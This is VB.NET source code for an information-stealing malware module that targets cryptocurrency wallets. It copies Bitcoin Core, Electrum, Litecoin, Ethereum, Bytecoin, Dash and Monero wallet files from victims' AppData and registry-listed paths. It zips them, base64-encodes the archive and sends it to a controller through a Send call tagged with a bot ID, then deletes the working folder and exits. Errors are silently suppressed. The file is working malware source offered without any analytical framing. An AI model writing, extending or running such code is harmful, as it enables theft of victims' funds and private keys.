Class Crypto

    Public Shared count As Integer = 0
    Public Shared Sub BitcoinCore(ByVal directorypath As String)
        Try

            Using registryKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt")

                Try
                    IO.Directory.CreateDirectory(directorypath & "\BitcoinCore\")
                    IO.File.Copy(registryKey.GetValue("strDataDir").ToString() & "\wallet.dat", directorypath & "\BitcoinCore\wallet.dat")
                    count += 1
                Catch ex As Exception
                End Try
            End Using

        Catch ex As Exception
        End Try
    End Sub

    Public Shared Sub Electrum(ByVal directorypath As String)
        Try

            For Each file As IO.FileInfo In New IO.DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Electrum\wallets").GetFiles()
                IO.Directory.CreateDirectory(directorypath & "\Electrum\")
                file.CopyTo(directorypath & "\Electrum\" & file.Name)
                count += 1
            Next

        Catch ex As Exception
        End Try
    End Sub

    Public Shared Sub LTC(ByVal directorypath As String)
        Try

            Using registryKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Litecoin").OpenSubKey("Litecoin-Qt")

                Try
                    IO.Directory.CreateDirectory(directorypath & "\LitecoinCore\")
                    IO.File.Copy(registryKey.GetValue("strDataDir").ToString() & "\wallet.dat", directorypath & "\LitecoinCore\wallet.dat")
                    count += 1
                Catch ex As Exception
                End Try
            End Using

        Catch ex As Exception
        End Try
    End Sub

    Public Shared Sub ETH(ByVal directorypath As String)
        Try

            For Each file As IO.FileInfo In New IO.DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Ethereum\keystore").GetFiles()
                IO.Directory.CreateDirectory(directorypath & "\Ethereum\")
                file.CopyTo(directorypath & "\Ethereum\" & file.Name)
                count += 1
            Next

        Catch ex As Exception
        End Try
    End Sub

    Public Shared Sub BCN(ByVal directorypath As String)
        Try

            For Each file As IO.FileInfo In New IO.DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\bytecoin").GetFiles()
                IO.Directory.CreateDirectory(directorypath & "\Bytecoin\")

                If file.Extension.Equals(".wallet") Then
                    file.CopyTo(directorypath & "\Bytecoin\" & file.Name)
                    count += 1
                End If
            Next

        Catch ex As Exception
        End Try
    End Sub

    Public Shared Sub DSH(ByVal directorypath As String)
        Try

            Using registryKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Dash").OpenSubKey("Dash-Qt")

                Try
                    IO.Directory.CreateDirectory(directorypath & "\DashCore\")
                    IO.File.Copy(registryKey.GetValue("strDataDir").ToString() & "\wallet.dat", directorypath & "\DashCore\wallet.dat")
                    count += 1
                Catch ex As Exception
                End Try
            End Using

        Catch ex As Exception
        End Try
    End Sub

    Public Shared Sub XMR_(ByVal directorypath As String)
        Try

            Using registryKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("monero-project").OpenSubKey("monero-core")

                Try
                    IO.Directory.CreateDirectory(directorypath & "\Monero\")
                    Dim dir As String = registryKey.GetValue("wallet_path").ToString().Replace("/", "\")
                    IO.Directory.CreateDirectory(directorypath & "\Monero\")
                    IO.File.Copy(dir, directorypath & "\Monero\" & dir.Split("\"c)(dir.Split("\"c).Length - 1))
                    count += 1
                Catch ex As Exception
                End Try
            End Using

        Catch ex As Exception
        End Try
    End Sub

    Public Shared Sub Zip(ByVal dir As String, ByVal zipPath As String)
        Try
            IO.Compression.ZipFile.CreateFromDirectory(dir, zipPath, IO.Compression.CompressionLevel.Optimal, False)
        Catch e As Exception
        End Try
    End Sub

    Public Shared Function Steal(ByVal cryptoDir As String) As Integer
        Crypto.BCN(cryptoDir)
        Crypto.BitcoinCore(cryptoDir)
        Crypto.DSH(cryptoDir)
        Crypto.Electrum(cryptoDir)
        Crypto.ETH(cryptoDir)
        Crypto.LTC(cryptoDir)
        Crypto.XMR_(cryptoDir)
        Return count
    End Function

    Public Shared Sub Run()
        Dim dir As String = Environment.GetEnvironmentVariable("temp") & "\" + Main.BOT
        Dim workDir As String = dir & "\Directory"
        Dim cryptoDir As String = workDir & "\Wallets"
        IO.Directory.CreateDirectory(workDir)
        IO.Directory.CreateDirectory(cryptoDir)
        Dim bl As Boolean = False
        Dim text As String = ""
        Dim wlt As Integer = Crypto.Steal(cryptoDir)
        Dim zipName As String = dir & "\" & Main.BOT & ".zip"
        Zip(workDir, zipName)
        Main.Send("CRYP" + Main.SPL + Main.BOT + Main.SPL + Convert.ToBase64String(IO.File.ReadAllBytes(zipName)) + Main.SPL + count.ToString)
        IO.Directory.Delete(dir, True)
        Main.CloseMe()
    End Sub
End Class
